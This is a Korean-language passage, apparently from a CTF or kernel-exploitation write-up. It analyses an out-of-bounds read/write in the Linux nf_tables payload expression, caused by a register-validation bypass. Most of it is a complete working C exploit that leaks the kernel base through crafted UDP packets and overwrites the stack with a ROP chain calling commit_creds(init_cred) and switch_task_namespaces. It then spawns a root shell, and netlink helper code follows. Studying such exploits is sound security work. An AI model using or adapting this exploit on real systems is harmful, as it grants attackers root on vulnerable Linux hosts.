NULL,NFT_DATA_VALUE, priv-\u0026gt;len); } init에서 실질적으로 검증 우회해서 dreg OOB 발생시킬 수 있다.\nvoid nft_payload_eval(const struct nft_expr *expr, struct nft_regs *regs, const struct nft_pktinfo *pkt) { const struct nft_payload *priv = nft_expr_priv(expr); const struct sk_buff *skb = pkt-\u0026gt;skb; u32 *dest = \u0026amp;regs-\u0026gt;data[priv-\u0026gt;dreg]; int offset; if (priv-\u0026gt;len % NFT_REG32_SIZE) dest[priv-\u0026gt;len / NFT_REG32_SIZE] = 0; switch (priv-\u0026gt;base) { case NFT_PAYLOAD_LL_HEADER: if (!skb_mac_header_was_set(skb)) goto err; if (skb_vlan_tag_present(skb)) { if (!nft_payload_copy_vlan(dest, skb, priv-\u0026gt;offset, priv-\u0026gt;len)) goto err; return; } offset = skb_mac_header(skb) - skb-\u0026gt;data; break; case NFT_PAYLOAD_NETWORK_HEADER: offset = skb_network_offset(skb); break; case NFT_PAYLOAD_TRANSPORT_HEADER: if (!pkt-\u0026gt;tprot_set) goto err; offset = nft_thoff(pkt); break; default: BUG(); } offset += priv-\u0026gt;offset; if (skb_copy_bits(skb, offset, dest, priv-\u0026gt;len) \u0026lt; 0) goto err; return; err: regs-\u0026gt;verdict.code = NFT_BREAK; } eval에서 실질적으로 처리한다.\nint skb_copy_bits(const struct sk_buff *skb, int offset, void *to, int len) { int start = skb_headlen(skb); struct sk_buff *frag_iter; int i, copy; if (offset \u0026gt; (int)skb-\u0026gt;len - len) goto fault; /* Copy header. */ if ((copy = start - offset) \u0026gt; 0) { if (copy \u0026gt; len) copy = len; skb_copy_from_linear_data_offset(skb, offset, to, copy); if ((len -= copy) == 0) return 0; offset += copy; to += copy; } for (i = 0; i \u0026lt; skb_shinfo(skb)-\u0026gt;nr_frags; i++) { int end; skb_frag_t *f = \u0026amp;skb_shinfo(skb)-\u0026gt;frags[i]; WARN_ON(start \u0026gt; offset + len); end = start + skb_frag_size(f); if ((copy = end - offset) \u0026gt; 0) { u32 p_off, p_len, copied; struct page *p; u8 *vaddr; if (copy \u0026gt; len) copy = len; skb_frag_foreach_page(f, skb_frag_off(f) + offset - start, copy, p, p_off, p_len, copied) { vaddr = kmap_atomic(p); memcpy(to + copied, vaddr + p_off, p_len); kunmap_atomic(vaddr); } if ((len -= copy) == 0) return 0; offset += copy; to += copy; } start = end; } skb_walk_frags(skb, frag_iter) { int end; WARN_ON(start \u0026gt; offset + len); end = start + frag_iter-\u0026gt;len; if ((copy = end - offset) \u0026gt; 0) { if (copy \u0026gt; len) copy = len; if (skb_copy_bits(frag_iter, offset - start, to, copy)) goto fault; if ((len -= copy) == 0) return 0; offset += copy; to += copy; } start = end; } if (!len) return 0; fault: return -EFAULT; } EXPORT_SYMBOL(skb_copy_bits); static inline void skb_copy_from_linear_data_offset(const struct sk_buff *skb, const int offset, void *to, const unsigned int len) { memcpy(to, skb-\u0026gt;data + offset, len); } OOB write\nnft_payload_set_ops static int nft_payload_set_init(const struct nft_ctx *ctx, const struct nft_expr *expr, const struct nlattr * const tb[]) { struct nft_payload_set *priv = nft_expr_priv(expr); priv-\u0026gt;base = ntohl(nla_get_be32(tb[NFTA_PAYLOAD_BASE])); priv-\u0026gt;offset = ntohl(nla_get_be32(tb[NFTA_PAYLOAD_OFFSET])); priv-\u0026gt;len = ntohl(nla_get_be32(tb[NFTA_PAYLOAD_LEN])); if (tb[NFTA_PAYLOAD_CSUM_TYPE]) priv-\u0026gt;csum_type = ntohl(nla_get_be32(tb[NFTA_PAYLOAD_CSUM_TYPE])); if (tb[NFTA_PAYLOAD_CSUM_OFFSET]) priv-\u0026gt;csum_offset = ntohl(nla_get_be32(tb[NFTA_PAYLOAD_CSUM_OFFSET])); if (tb[NFTA_PAYLOAD_CSUM_FLAGS]) { u32 flags; flags = ntohl(nla_get_be32(tb[NFTA_PAYLOAD_CSUM_FLAGS])); if (flags \u0026amp; ~NFT_PAYLOAD_L4CSUM_PSEUDOHDR) return -EINVAL; priv-\u0026gt;csum_flags = flags; } switch (priv-\u0026gt;csum_type) { case NFT_PAYLOAD_CSUM_NONE: case NFT_PAYLOAD_CSUM_INET: break; case NFT_PAYLOAD_CSUM_SCTP: if (priv-\u0026gt;base != NFT_PAYLOAD_TRANSPORT_HEADER) return -EINVAL; if (priv-\u0026gt;csum_offset != offsetof(struct sctphdr, checksum)) return -EINVAL; break; default: return -EOPNOTSUPP; } return nft_parse_register_load(tb[NFTA_PAYLOAD_SREG], \u0026amp;priv-\u0026gt;sreg, priv-\u0026gt;len); } 여기서 아까 그거 호출된다.\nstatic void nft_payload_set_eval(const struct nft_expr *expr, struct nft_regs *regs, const struct nft_pktinfo *pkt) { const struct nft_payload_set *priv = nft_expr_priv(expr); struct sk_buff *skb = pkt-\u0026gt;skb; const u32 *src = \u0026amp;regs-\u0026gt;data[priv-\u0026gt;sreg]; int offset, csum_offset; __wsum fsum, tsum; switch (priv-\u0026gt;base) { case NFT_PAYLOAD_LL_HEADER: if (!skb_mac_header_was_set(skb)) goto err; offset = skb_mac_header(skb) - skb-\u0026gt;data; break; case NFT_PAYLOAD_NETWORK_HEADER: offset = skb_network_offset(skb); break; case NFT_PAYLOAD_TRANSPORT_HEADER: if (!pkt-\u0026gt;tprot_set) goto err; offset = nft_thoff(pkt); break; default: BUG(); } csum_offset = offset + priv-\u0026gt;csum_offset; offset += priv-\u0026gt;offset; if ((priv-\u0026gt;csum_type == NFT_PAYLOAD_CSUM_INET || priv-\u0026gt;csum_flags) \u0026amp;\u0026amp; (priv-\u0026gt;base != NFT_PAYLOAD_TRANSPORT_HEADER || skb-\u0026gt;ip_summed != CHECKSUM_PARTIAL)) { fsum = skb_checksum(skb, offset, priv-\u0026gt;len, 0); tsum = csum_partial(src, priv-\u0026gt;len, 0); if (priv-\u0026gt;csum_type == NFT_PAYLOAD_CSUM_INET \u0026amp;\u0026amp; nft_payload_csum_inet(skb, src, fsum, tsum, csum_offset)) goto err; if (priv-\u0026gt;csum_flags \u0026amp;\u0026amp; nft_payload_l4csum_update(pkt, skb, fsum, tsum) \u0026lt; 0) goto err; } if (skb_ensure_writable(skb, max(offset + priv-\u0026gt;len, 0)) || skb_store_bits(skb, offset, src, priv-\u0026gt;len) \u0026lt; 0) goto err; if (priv-\u0026gt;csum_type == NFT_PAYLOAD_CSUM_SCTP \u0026amp;\u0026amp; pkt-\u0026gt;tprot == IPPROTO_SCTP \u0026amp;\u0026amp; skb-\u0026gt;ip_summed != CHECKSUM_PARTIAL) { if (nft_payload_csum_sctp(skb, nft_thoff(pkt))) goto err; } return; err: regs-\u0026gt;verdict.code = NFT_BREAK; } int skb_store_bits(struct sk_buff *skb, int offset, const void *from, int len) { int start = skb_headlen(skb); struct sk_buff *frag_iter; int i, copy; if (offset \u0026gt; (int)skb-\u0026gt;len - len) goto fault; if ((copy = start - offset) \u0026gt; 0) { if (copy \u0026gt; len) copy = len; skb_copy_to_linear_data_offset(skb, offset, from, copy); if ((len -= copy) == 0) return 0; offset += copy; from += copy; } for (i = 0; i \u0026lt; skb_shinfo(skb)-\u0026gt;nr_frags; i++) { skb_frag_t *frag = \u0026amp;skb_shinfo(skb)-\u0026gt;frags[i]; int end; WARN_ON(start \u0026gt; offset + len); end = start + skb_frag_size(frag); if ((copy = end - offset) \u0026gt; 0) { u32 p_off, p_len, copied; struct page *p; u8 *vaddr; if (copy \u0026gt; len) copy = len; skb_frag_foreach_page(frag, skb_frag_off(frag) + offset - start, copy, p, p_off, p_len, copied) { vaddr = kmap_atomic(p); memcpy(vaddr + p_off, from + copied, p_len); kunmap_atomic(vaddr); } if ((len -= copy) == 0) return 0; offset += copy; from += copy; } start = end; } skb_walk_frags(skb, frag_iter) { int end; WARN_ON(start \u0026gt; offset + len); end = start + frag_iter-\u0026gt;len; if ((copy = end - offset) \u0026gt; 0) { if (copy \u0026gt; len) copy = len; if (skb_store_bits(frag_iter, offset - start, from, copy)) goto fault; if ((len -= copy) == 0) return 0; offset += copy; from += copy; } start = end; } if (!len) return 0; fault: return -EFAULT; } EXPORT_SYMBOL(skb_store_bits); ... static inline void skb_copy_to_linear_data_offset(struct sk_buff *skb, const int offset, const void *from, const unsigned int len) { memcpy(skb-\u0026gt;data + offset, from, len); } OOB read\ncase NFT_META_L4PROTO: if (!pkt-\u0026gt;tprot_set) goto err; nft_reg_store8(dest, pkt-\u0026gt;tprot); break; ... if (pkt-\u0026gt;tprot != IPPROTO_TCP \u0026amp;\u0026amp; pkt-\u0026gt;tprot != IPPROTO_UDP) { regs-\u0026gt;verdict.code = NFT_BREAK; return; } ... #define IPPROTO_UDP\tIPPROTO_UDP ... enum { IPPROTO_IP = 0,\t/* Dummy protocol for TCP\t*/ #define IPPROTO_IP\tIPPROTO_IP IPPROTO_ICMP = 1,\t/* Internet Control Message Protocol\t*/ #define IPPROTO_ICMP\tIPPROTO_ICMP IPPROTO_IGMP = 2,\t/* Internet Group Management Protocol\t*/ #define IPPROTO_IGMP\tIPPROTO_IGMP IPPROTO_IPIP = 4,\t/* IPIP tunnels (older KA9Q tunnels use 94) */ #define IPPROTO_IPIP\tIPPROTO_IPIP IPPROTO_TCP = 6,\t/* Transmission Control Protocol\t*/ #define IPPROTO_TCP\tIPPROTO_TCP IPPROTO_EGP = 8,\t/* Exterior Gateway Protocol\t*/ #define IPPROTO_EGP\tIPPROTO_EGP IPPROTO_PUP = 12,\t/* PUP protocol\t*/ #define IPPROTO_PUP\tIPPROTO_PUP IPPROTO_UDP = 17,\t/* User Datagram Protocol\t*/ 매크로 열심히 뒤져봤더니 L4proto 부분 어떻게 필터링하는지 알 수 있었다. 17번 사용한다.\nenum nft_payload_bases { NFT_PAYLOAD_LL_HEADER, NFT_PAYLOAD_NETWORK_HEADER, NFT_PAYLOAD_TRANSPORT_HEADER, }; 이때 base 세팅해서 확인도 가능.\nExploitation static unsigned int nft_parse_register(const struct nlattr *attr) { unsigned int reg; reg = ntohl(nla_get_be32(attr)); switch (reg) { case NFT_REG_VERDICT...NFT_REG_4: return reg * NFT_REG_SIZE / NFT_REG32_SIZE; default: return reg + NFT_REG_SIZE / NFT_REG32_SIZE - NFT_REG32_00; } } -4 한 상태로 들어간다.\nstatic int nft_validate_register_load(enum nft_registers reg, unsigned int len) { if (reg \u0026lt; NFT_REG_1 * NFT_REG_SIZE / NFT_REG32_SIZE) return -EINVAL; if (len == 0) return -EINVAL; if (reg * NFT_REG32_SIZE + len \u0026gt; sizeof_field(struct nft_regs, data)) return -ERANGE; return 0; } \u0026gt;\u0026gt;\u0026gt; print(hex(((0xffffff00+0xe8)* 4 + (0x70))\u0026amp;0xffffffff)) 이런식으로 bypass 된다. 들어갈때 -4 해서 들어가니 잘 고려해주고, idx도 4 곱해진다는 걸 고려해서 릭을 할 수 있다.\n0xffffffff82000195 \u0026lt;__do_softirq+405\u0026gt; jne __do_softirq+650 \u0026lt;__do_softirq+650\u0026gt; 0xffffffff8200019b \u0026lt;__do_softirq+411\u0026gt; mov edx, dword ptr [rbp - 0x44] 0xffffffff8200019e \u0026lt;__do_softirq+414\u0026gt; mov rax, qword ptr gs:[0x1fbc0] __do_softirq 부분 정상적으로 종료 어디서 되는지 확인해보고, 이때 여기서 뭘 집어넣길래 이부분이 키 복구하는 쪽이라는 것을 알았다. 그래서 rbp-0x44의 정상적인 값을 찾았고, 그걸로 집어넣으면 된다. 마지막 부분에 soft_irq가 돌아가는 부분이 있어서 ROP 체인 실행시키고 나서 얘를 이용해서 나가면 된다.\npwndbg\u0026gt; x/40xi 0xffffffff810bd765 0xffffffff810bd765 \u0026lt;do_softirq+117\u0026gt;: pop rsp 0xffffffff810bd766 \u0026lt;do_softirq+118\u0026gt;: mov BYTE PTR gs:[rip+0x7ef62416],0x0 # 0x1fb84 \u0026lt;hardirq_stack_inuse\u0026gt; 0xffffffff810bd76e \u0026lt;do_softirq+126\u0026gt;: and bh,0x2 0xffffffff810bd771 \u0026lt;do_softirq+129\u0026gt;: je 0xffffffff810bd72c \u0026lt;do_softirq+60\u0026gt; 0xffffffff810bd773 \u0026lt;do_softirq+131\u0026gt;: sti 0xffffffff810bd774 \u0026lt;do_softirq+132\u0026gt;: nop WORD PTR [rax+rax*1+0x0] 0xffffffff810bd77a \u0026lt;do_softirq+138\u0026gt;: mov rbx,QWORD PTR [rbp-0x8] 0xffffffff810bd77e \u0026lt;do_softirq+142\u0026gt;: leave 0xffffffff810bd77f \u0026lt;do_softirq+143\u0026gt;: ret 0xffffffff810bd780 \u0026lt;do_softirq+144\u0026gt;: call 0xffffffff810df6 pop rsp해줘서 돌아가는데, 이때 rbp까지 같이 맞춰주면 정상적으로 돌아갈 수 있다.\n*(uint64_t *)(udpbuf+i*8) = cur_stack + 0x3f88; i++; *(uint64_t *)(udpbuf+i*8) = kernel_base + cliret; i++; *(uint64_t *)(udpbuf+i*8) = kernel_base + prbp;i++; *(uint64_t *)(udpbuf+i*8) = cur_stack+0x3f60;i++; *(uint64_t *)(udpbuf+i*8)= kernel_base + 0x100016d;i++; *(uint64_t *)(udpbuf+i*8) = 0x40010000000000;i++; *(uint64_t *)(udpbuf+i*8)= 0x40010000000000;i++; *(uint64_t *)(udpbuf+i*8) = 0x40010000000000;i++; *(uint64_t *)(udpbuf+i*8) = 0x40010000000000;i++; *(uint64_t *)(udpbuf+i*8) = 0x40010000000000;i++; *(uint64_t *)(udpbuf+i*8) = 0x40010000000000;i++; *(uint64_t *)(udpbuf+i*8) = 0x400100;i++; *(uint64_t *)(udpbuf+i*8) = 0x400100;i++; *(uint64_t *)(udpbuf+i*8) = 0x400100;i++; *(uint64_t *)(udpbuf+i*8) = cur_stack+0x3f58;i++; //sfp *(uint64_t *)(udpbuf+i*8) = cur_stack+0x3f58;i++; //r15 *(uint64_t *)(udpbuf+i*8) = kernel_base + bpf_get_current_task;i++; *(uint64_t *)(udpbuf+i*8) = kernel_base + movrdirax;i++; *(uint64_t *)(udpbuf+i*8) = kernel_base + prsi;i++; *(uint64_t *)(udpbuf+i*8) = data_base + data_init_nsproxy;i++; *(uint64_t *)(udpbuf+i*8) = kernel_base + switch_task_namespace;i++; *(uint64_t *)(udpbuf+i*8) = kernel_base + prdi;i++; *(uint64_t *)(udpbuf+i*8) = data_base + data_init_cred;i++; *(uint64_t *)(udpbuf+i*8) = kernel_base + commit_creds;i++; *(uint64_t *)(udpbuf+i*8) = kernel_base + ret;i++; *(uint64_t *)(udpbuf+i*8) = kernel_base + ret;i++; *(uint64_t *)(udpbuf+i*8) = kernel_base + ret;i++; *(uint64_t *)(udpbuf+i*8) = kernel_base + ret;i++; *(uint64_t *)(udpbuf+i*8) = kernel_base + ret;i++; *(uint64_t *)(udpbuf+i*8) = kernel_base + ret;i++; *(uint64_t *)(udpbuf+i*8) = kernel_base + go;i++; 다음과 같은 체인을 이용해 미리 cli를 호출해주고, __do_softirq 부분 뒷부분을 많이 짤라서 편하게 할 수 있다. 그리고 권한 상승후 do_softirq로 나가줬다.\nExploit code #define _GNU_SOURCE #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;time.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;stddef.h\u0026gt; #include \u0026#34;utils.h\u0026#34; #define prdi 0xa4f20 #define prsi 0xfd61e #define prdx 0x66a40 #define pushrax 0x463d5 #define ret 0x1fc #define prbp 0x802 #define stiret 0x65e115 // dec ecx #define cliret 0x5ec83a #define bpf_get_current_task 0x217de0 #define movrdirax 0x625d74 // 0xffffffff81625d74 : mov rdi, rax ; jne 0xffffffff81625d61 ; xor eax, eax ; ret #define data_init_nsproxy 0x202060 #define switch_task_namespace 0xe5c80 #define data_init_cred 0x2022a0 #define commit_creds 0xe74a0 #define go 0x22c92 // add rsp, 0x10 ; pop r12 ; pop r13 ; pop rbp ; ret static struct nftnl_rule *isolate_udp_pkt(uint8_t family, const char *table, const char *chain, const char * target_chain) { struct nftnl_rule *r = NULL; uint16_t port = 8888; r = nftnl_rule_alloc(); if (r == NULL) { perror(\u0026#34;OOM\u0026#34;); exit(EXIT_FAILURE); } nftnl_rule_set_str(r, NFTNL_RULE_TABLE, table); nftnl_rule_set_str(r, NFTNL_RULE_CHAIN, chain); nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, family); // meta load l4proto =\u0026gt; reg 1 add_meta(r, NFT_META_L4PROTO, NFT_REG_1); uint8_t v = 17; add_cmp(r,NFT_REG_1 ,NFT_CMP_EQ,\u0026amp;v,sizeof(v)); add_payload(r, NFT_PAYLOAD_TRANSPORT_HEADER, 0,NFT_REG32_01, 2, 2); uint16_t dport = htons(port); add_cmp(r,NFT_REG32_01, NFT_CMP_EQ , \u0026amp;dport, sizeof(dport)); add_verdict(r, NFT_JUMP, target_chain, NFT_REG_VERDICT); // TODO return r; } static struct nftnl_rule *edit_udp_data(uint8_t family, const char *table, const char *chain) { struct nftnl_rule *r = NULL; r = nftnl_rule_alloc(); if (r == NULL) { perror(\u0026#34;OOM\u0026#34;); exit(EXIT_FAILURE); } // enum nft_payload_bases { // NFT_PAYLOAD_LL_HEADER, // NFT_PAYLOAD_NETWORK_HEADER, // NFT_PAYLOAD_TRANSPORT_HEADER, // }; nftnl_rule_set_str(r, NFTNL_RULE_TABLE, table); nftnl_rule_set_str(r, NFTNL_RULE_CHAIN, chain); nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, family); int off = 0xfc; add_payload(r,NFT_PAYLOAD_TRANSPORT_HEADER,0xffffff00+off,0x0,0x8,0x70); // TODO return r; } static struct nftnl_rule *rop(uint8_t family, const char *table, const char *chain) { struct nftnl_rule *r = NULL; r = nftnl_rule_alloc(); if (r == NULL) { perror(\u0026#34;OOM\u0026#34;); exit(EXIT_FAILURE); } nftnl_rule_set_str(r, NFTNL_RULE_TABLE, table); nftnl_rule_set_str(r, NFTNL_RULE_CHAIN, chain); nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, family); int off = 0xd4; add_payload(r,NFT_PAYLOAD_TRANSPORT_HEADER,0x0,0xffffff00+off+4,0x8,0xff); // add_payload(r,NFT_PAYLOAD_TRANSPORT_HEADER,0x0,1,0x8,0x8); // TODO return r; } void install_rule_for_leak() { if(create_rule(isolate_udp_pkt(NFPROTO_IPV4, \u0026#34;filter\u0026#34;, \u0026#34;input\u0026#34;, \u0026#34;leak\u0026#34;)) == 0 ){ perror(\u0026#34;error creating rule\u0026#34;); exit(EXIT_FAILURE); } if(create_rule(edit_udp_data(NFPROTO_IPV4, \u0026#34;filter\u0026#34;, \u0026#34;leak\u0026#34;)) == 0 ){ perror(\u0026#34;error creating rule\u0026#34;); exit(EXIT_FAILURE); } } void install_rule_for_rop(){ if(create_rule(isolate_udp_pkt(NFPROTO_IPV4, \u0026#34;filter\u0026#34;, \u0026#34;input2\u0026#34;, \u0026#34;rop\u0026#34;)) == 0 ){ perror(\u0026#34;error creating rule\u0026#34;); exit(EXIT_FAILURE); } if(create_rule(rop(NFPROTO_IPV4, \u0026#34;filter\u0026#34;, \u0026#34;rop\u0026#34;)) == 0 ){ perror(\u0026#34;error creating rule\u0026#34;); exit(EXIT_FAILURE); } } void udp_client(void * data){ int sockfd; struct sockaddr_in server_addr; char * buf = malloc(0x200); sockfd = socket(AF_INET, SOCK_DGRAM, 0); if (sockfd == -1) { perror(\u0026#34;socket\u0026#34;); exit(EXIT_FAILURE); } server_addr.sin_family = AF_INET; server_addr.sin_port = htons(8888); inet_pton(AF_INET, \u0026#34;127.0.0.1\u0026#34;, \u0026amp;(server_addr.sin_addr)); if (connect(sockfd, (struct sockaddr *)\u0026amp;server_addr, sizeof((server_addr))) == -1) { perror(\u0026#34;connect\u0026#34;); close(sockfd); exit(EXIT_FAILURE); } int res = write(sockfd, data, 0x200); close(sockfd); return 0; } void udp_server(void * buf){ struct sockaddr_in server_addr; socklen_t server_addr_len; struct sockaddr_in client_addr; socklen_t client_addr_len; char tmp[0x200]; client_addr_len = sizeof( client_addr); int fd = socket(AF_INET, SOCK_DGRAM, 0); server_addr.sin_family = AF_INET; server_addr.sin_port = htons(8888); server_addr.sin_addr.s_addr=htonl(INADDR_ANY ); if (bind(fd, (struct sockaddr *)\u0026amp;server_addr, sizeof(server_addr)) == -1) { perror(\u0026#34;bind\u0026#34;); close(fd); exit(EXIT_FAILURE); } recvfrom(fd, buf, 0x200,0,\u0026amp;client_addr,client_addr_len);\trecvfrom(fd, tmp, 0x200,0,\u0026amp;client_addr,client_addr_len);\treturn 0; } int main(int argc, char *argv[]) { int tid, status; pthread_t p_thread; unsigned char udpbuf[512] = {0,}; uint64_t kernel_base = 0; memset(udpbuf, 0x41, 512); new_ns(); system(\u0026#34;ip link set lo up\u0026#34;); printf(\u0026#34;[+] Leak kernel base address\\n\u0026#34;); printf(\u0026#34; [-] install udp server\\n\u0026#34;); uint64_t * buf = malloc(0x200); tid = pthread_create(\u0026amp;p_thread, NULL, udp_server, buf); if (tid \u0026lt; 0){ perror(\u0026#34;thread create error : \u0026#34;); exit(0); } printf(\u0026#34; [-] setup nftables\\n\u0026#34;); if(create_table(NFPROTO_IPV4, \u0026#34;filter\u0026#34;, false) == 0){ perror(\u0026#34;error creating table\u0026#34;); exit(EXIT_FAILURE); } if(create_chain(\u0026#34;filter\u0026#34;, \u0026#34;input\u0026#34;, NF_INET_LOCAL_IN) == 0){ perror(\u0026#34;error creating chain\u0026#34;); exit(EXIT_FAILURE); } if(create_chain(\u0026#34;filter\u0026#34;, \u0026#34;leak\u0026#34;, 0) == 0){ perror(\u0026#34;error creating chain\u0026#34;); exit(EXIT_FAILURE); } install_rule_for_leak(); printf(\u0026#34; [-] send \u0026amp; recv udp packet\\n\u0026#34;); usleep(1000); udp_client(udpbuf); sleep(1); hexdump(buf,0x200); uint64_t data_base = buf[0] - 0x17e0d8; uint64_t cur_stack = buf[5] - 0x3fe8; kernel_base = buf[6] - 0x10000d9; printf(\u0026#34; [-] kernel base address 0x%lx\\n\u0026#34;, kernel_base); printf(\u0026#34; [-] leaked 0x%lx\\n\u0026#34;, cur_stack); printf(\u0026#34; [-] leaked 0x%lx\\n\u0026#34;, data_base); delete_chain(\u0026#34;filter\u0026#34;,\u0026#34;input\u0026#34;); delete_chain(\u0026#34;filter\u0026#34;,\u0026#34;leak\u0026#34;); puts(\u0026#34;[+] Ropping\u0026#34;); if(create_chain(\u0026#34;filter\u0026#34;, \u0026#34;rop\u0026#34;, 0) == 0){ perror(\u0026#34;error creating chain\u0026#34;); exit(EXIT_FAILURE); } if(create_chain(\u0026#34;filter\u0026#34;, \u0026#34;input2\u0026#34;, NF_INET_LOCAL_IN) == 0){ perror(\u0026#34;error creating chain\u0026#34;); exit(EXIT_FAILURE); } install_rule_for_rop(); puts(\u0026#34; [-] install rop chain\u0026#34;); memset(udpbuf, 0x41, 512); int i = 0; *(uint64_t *)(udpbuf+i*8) = cur_stack + 0x3f88; i++; *(uint64_t *)(udpbuf+i*8) = kernel_base + cliret; i++;\t*(uint64_t *)(udpbuf+i*8) = kernel_base + prbp;i++; *(uint64_t *)(udpbuf+i*8) = cur_stack+0x3f60;i++; *(uint64_t *)(udpbuf+i*8)= kernel_base + 0x100016d;i++; *(uint64_t *)(udpbuf+i*8) = 0x40010000000000;i++; *(uint64_t *)(udpbuf+i*8)= 0x40010000000000;i++; *(uint64_t *)(udpbuf+i*8) = 0x40010000000000;i++; *(uint64_t *)(udpbuf+i*8) = 0x40010000000000;i++; *(uint64_t *)(udpbuf+i*8) = 0x40010000000000;i++; *(uint64_t *)(udpbuf+i*8) = 0x40010000000000;i++; *(uint64_t *)(udpbuf+i*8) = 0x400100;i++; *(uint64_t *)(udpbuf+i*8) = 0x400100;i++; *(uint64_t *)(udpbuf+i*8) = 0x400100;i++; *(uint64_t *)(udpbuf+i*8) = cur_stack+0x3f58;i++; //sfp *(uint64_t *)(udpbuf+i*8) = cur_stack+0x3f58;i++; //r15 *(uint64_t *)(udpbuf+i*8) = kernel_base + bpf_get_current_task;i++; *(uint64_t *)(udpbuf+i*8) = kernel_base + movrdirax;i++; *(uint64_t *)(udpbuf+i*8) = kernel_base + prsi;i++; *(uint64_t *)(udpbuf+i*8) = data_base + data_init_nsproxy;i++; *(uint64_t *)(udpbuf+i*8) = kernel_base + switch_task_namespace;i++; *(uint64_t *)(udpbuf+i*8) = kernel_base + prdi;i++; *(uint64_t *)(udpbuf+i*8) = data_base + data_init_cred;i++; *(uint64_t *)(udpbuf+i*8) = kernel_base + commit_creds;i++; *(uint64_t *)(udpbuf+i*8) = kernel_base + ret;i++; *(uint64_t *)(udpbuf+i*8) = kernel_base + ret;i++; *(uint64_t *)(udpbuf+i*8) = kernel_base + ret;i++; *(uint64_t *)(udpbuf+i*8) = kernel_base + ret;i++; *(uint64_t *)(udpbuf+i*8) = kernel_base + ret;i++; *(uint64_t *)(udpbuf+i*8) = kernel_base + ret;i++; *(uint64_t *)(udpbuf+i*8) = kernel_base + go;i++; puts(\u0026#34; [-] install udp client\u0026#34;); udp_client(udpbuf); pthread_join(p_thread, (void **)\u0026amp;status); puts(\u0026#34; [-] Spawning sh\u0026#34;); system(\u0026#34;/bin/sh\u0026#34;); return 0; } // 306 // rbp-0x40 = 0xffffc6ca // \u0026gt; // cli ret // 0xffffffff8200016d - 0x100016d WAKEUP #include \u0026lt;netinet/in.h\u0026gt; #include \u0026lt;netinet/ip.h\u0026gt; #include \u0026lt;netinet/tcp.h\u0026gt; #include \u0026lt;arpa/inet.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;sys/socket.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;pthread.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;sched.h\u0026gt; #include \u0026lt;sys/ioctl.h\u0026gt; #include \u0026lt;ctype.h\u0026gt; #include \u0026lt;linux/netfilter.h\u0026gt; #include \u0026lt;linux/netfilter/nfnetlink.h\u0026gt; #include \u0026lt;linux/netfilter/nf_tables.h\u0026gt; #include \u0026lt;libmnl/libmnl.h\u0026gt; #include \u0026lt;libnftnl/rule.h\u0026gt; #include \u0026lt;libnftnl/expr.h\u0026gt; #include \u0026lt;libnftnl/table.h\u0026gt; #include \u0026lt;libnftnl/chain.h\u0026gt; void pin_cpu(int cpu) { cpu_set_t set; CPU_ZERO(\u0026amp;set); CPU_SET(cpu, \u0026amp;set); if (sched_setaffinity(0, sizeof(cpu_set_t), \u0026amp;set)) { printf(\u0026#34;error\\n\u0026#34;); exit(-1); } } bool create_table(uint32_t protocol, char * table_name, bool delete){ struct mnl_socket *nl; char buf[MNL_SOCKET_BUFFER_SIZE]; struct nlmsghdr *nlh; uint32_t portid, seq, table_seq, chain_seq, family; struct nftnl_table *t; struct mnl_nlmsg_batch *batch; int ret, batching; t = nftnl_table_alloc(); if (t == NULL) { perror(\u0026#34;nftnl_table_alloc\u0026#34;); return false; } nftnl_table_set_u32(t, NFTNL_TABLE_FAMILY, protocol); nftnl_table_set_str(t, NFTNL_TABLE_NAME, table_name); batching = nftnl_batch_is_supported(); if (batching \u0026lt; 0) { perror(\u0026#34;cannot talk to nfnetlink\u0026#34;); return false; } seq = time(NULL); batch = mnl_nlmsg_batch_start(buf, sizeof(buf)); if (batching) { nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++); mnl_nlmsg_batch_next(batch); } table_seq = seq; nlh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch), delete?NFT_MSG_DELTABLE:NFT_MSG_NEWTABLE, NFPROTO_IPV4, NLM_F_ACK, seq++); nftnl_table_nlmsg_build_payload(nlh, t); nftnl_table_free(t); mnl_nlmsg_batch_next(batch); if (batching) { nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++); mnl_nlmsg_batch_next(batch); } nl = mnl_socket_open(NETLINK_NETFILTER); if (nl == NULL) { perror(\u0026#34;mnl_socket_open\u0026#34;); return false; } if (mnl_socket_bind(nl, 0, MNL_SOCKET_AUTOPID) \u0026lt; 0) { perror(\u0026#34;mnl_socket_bind\u0026#34;); return false; } portid = mnl_socket_get_portid(nl); if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch), mnl_nlmsg_batch_size(batch)) \u0026lt; 0) { perror(\u0026#34;mnl_socket_send\u0026#34;); return false; } mnl_nlmsg_batch_stop(batch); ret = mnl_socket_recvfrom(nl, buf, sizeof(buf)); while (ret \u0026gt; 0) { ret = mnl_cb_run(buf, ret, table_seq, portid, NULL, NULL); if (ret \u0026lt;= 0) break; ret = mnl_socket_recvfrom(nl, buf, sizeof(buf)); } if (ret == -1) { perror(\u0026#34;error\u0026#34;); return false; } mnl_socket_close(nl); return true; } bool create_chain(char * table_name, char * chain_name, uint32_t hook_num){ // NF_INET_LOCAL_IN struct mnl_socket *nl; char buf[MNL_SOCKET_BUFFER_SIZE]; struct nlmsghdr *nlh; uint32_t portid, seq, chain_seq; int ret, family; struct nftnl_chain *t; struct mnl_nlmsg_batch *batch; int batching; t = nftnl_chain_alloc(); if (t == NULL) return false; nftnl_chain_set_str(t, NFTNL_CHAIN_TABLE, table_name); nftnl_chain_set_str(t, NFTNL_CHAIN_NAME, chain_name); if(hook_num != 0) nftnl_chain_set_u32(t, NFTNL_CHAIN_HOOKNUM, hook_num); nftnl_chain_set_u32(t, NFTNL_CHAIN_PRIO, 0); batching = nftnl_batch_is_supported(); if (batching \u0026lt; 0) { perror(\u0026#34;cannot talk to nfnetlink\u0026#34;); return false; } seq = time(NULL); batch = mnl_nlmsg_batch_start(buf, sizeof(buf)); if (batching) { nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++); mnl_nlmsg_batch_next(batch); } chain_seq = seq; nlh = 